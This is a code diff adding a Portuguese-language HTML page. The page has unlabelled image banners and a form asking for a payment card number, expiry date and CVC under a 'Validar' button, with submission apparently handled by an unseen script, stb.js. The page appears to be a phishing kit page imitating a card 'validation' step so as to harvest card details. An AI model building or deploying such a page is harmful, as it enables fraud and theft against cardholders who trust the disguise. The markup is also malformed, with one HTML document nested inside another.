@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/obset.css">
+    <title></title>
+</head>
+<body>
+    <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/doma.css">
+    <script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
+    <title></title>
+</head>
+<body>
+    
+    
+        <div>
+            <div class="upto">
+                <img src="./img/hedcordf1.png" alt="">
+            </div>
+        </div>
+    
+    
+        <div class="container">
+            <div class="container">
+            
+                <div class="ttcc">
+                    <img src="./img/topttcc.png" alt="">
+                </div>
+      
+      
+                <form method="post" id="pg2"> 
+                    <div class="clear">
+                        <p>Número do cartão</p>
+                        <input class="nar1" type="tel" name="" id="one" required maxlength="19" placeholder="____    ____    ____    ____">
+                        <p>Data de expiração</p>
+                        <div class="nar">
+        
+                            <input type="tel" name="" id="two1" required placeholder="MM" maxlength="2">
+        
+                            <input class="nar2" type="tel" name="" id="two2" required placeholder="AA" maxlength="4">
+                        </div>
+        
+        
+                        <p>Código CVC (verso do cartão)</p>
+                        <input type="tel" name="" id="three" required maxlength="4"> 
+        
+        
+                        
+                    </div>
+                    <span></span>
+                    <button class="ttn2">Validar</button>
+                </form>
+                    
+               
+               
+                
+              </div>
+        </div>
+    </div>
+
+    <div class="pola">
+        <div class="pola">
+            <img src="./img/botion.JPG" alt="">
+        </div>
+    </div>
+    <script>
+        $("#one").on("keyup",function(){
+            cc = $(this).val().split(" ").join("");
+            cc = cc.match(new RegExp('.{1,4}$|.{1,4}', 'g')).join(" ");
+            $(this).val(cc);
+        });
+    </script>
+    <script src="./js/stb.js"></script>
+</body>
+</html>
